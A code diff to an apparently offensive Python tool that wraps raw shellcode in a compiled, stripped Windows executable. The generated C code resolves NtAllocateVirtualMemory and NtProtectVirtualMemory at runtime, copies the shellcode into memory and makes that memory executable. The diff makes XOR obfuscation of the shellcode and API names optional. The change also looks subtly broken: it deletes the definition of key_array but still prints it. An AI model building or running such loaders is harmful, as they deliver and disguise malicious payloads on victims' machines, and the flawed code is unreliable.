@@ -5,11 +5,12 @@ import random
 
 if len(sys.argv) < 3:
     script_name = os.path.basename(sys.argv[0])
-    print(f"Usage: {script_name} <shellcode.bin> <output.exe> [-l <key_length>] [-k <key>]")
+    print(f"Usage: {script_name} <shellcode.bin> <output.exe> [-l <key_length>] [-k <key>] [-xor]")
     sys.exit(1)
 
 bin_file = sys.argv[1]
 output_exe = sys.argv[2]
+use_xor = "-xor" in sys.argv
 
 key_length = 1
 key = [random.randint(1, 255) for _ in range(key_length)]
@@ -56,8 +57,12 @@ def bytes_to_c_array(b: bytes) -> str:
 
 c_strings = ["ntdll.dll", "NtAllocateVirtualMemory", "NtProtectVirtualMemory"]
 
-xor_shellcode = xor_bytes(shellcode, key)
-xor_c_strings_enc = [xor_c_string(s, key) for s in c_strings]
+if use_xor:
+    xor_shellcode = xor_bytes(shellcode, key)
+    xor_c_strings_enc = [xor_c_string(s, key) for s in c_strings]
+else:
+    xor_shellcode = shellcode
+    xor_c_strings_enc = [s.encode() + b'\x00' for s in c_strings]
 
 offsets = []
 current_offset = 0
@@ -103,11 +108,14 @@ void _start() {{
     char* ntprotectvirtualmemory   = (char*)&stackbuf[{offsets[2]}];
 
     __attribute__((section(".text"))) static unsigned char enc_strings[] = {{ {combined_array} }};
+    
     for (SIZE_T i = 0; i < sizeof(enc_strings); i++)
         stackbuf[i] = enc_strings[i];
 
+#ifdef XOR
     for (SIZE_T i = 0; i < sizeof(stackbuf); i++)
         stackbuf[i] ^= key[i % key_len];
+#endif
 
     HMODULE hNtdll = myLoadLibraryA(ntdll_dll);
 
@@ -130,8 +138,13 @@ void _start() {{
         PAGE_READWRITE
     );
 
+#ifdef XOR
     for (SIZE_T i = 0; i < size; i++)
         ((unsigned char*)execMemory)[i] = shellcode[i] ^ key[i % key_len];
+#else
+    for (SIZE_T i = 0; i < size; i++)
+        ((unsigned char*)execMemory)[i] = shellcode[i];
+#endif
 
     ULONG oldProtect;
     status = pNtProtectVirtualMemory(
@@ -150,14 +163,19 @@ compile_cmd = [
     "x86_64-w64-mingw32-gcc",
     "-s", "-nostdlib", "-nostartfiles", "-ffreestanding",
     "-fno-ident", "-Wl,-subsystem,windows", "-e", "_start",
-    "-Os", "-fPIC", "-fno-asynchronous-unwind-tables", "-DXOR",
+    "-Os", "-fPIC", "-fno-asynchronous-unwind-tables",
     "-x", "c", "-", "-o", output_exe
 ]
+
+if use_xor:
+    compile_cmd.append("-DXOR")
 
 proc = subprocess.run(compile_cmd, input=c_code.encode(), stdout=subprocess.PIPE, stderr=subprocess.PIPE)
 if proc.returncode != 0:
     print(proc.stderr.decode())
     sys.exit(1)
 
-key_array = ",".join(f"0x{b:02x}" for b in key)
-print(f"[+] Executable generated: {output_exe} (XOR key: {key_array})")
+if use_xor:
+    print(f"[+] Executable generated: {output_exe} (XOR key: {key_array})")
+else:
+    print(f"[+] Executable generated: {output_exe}")
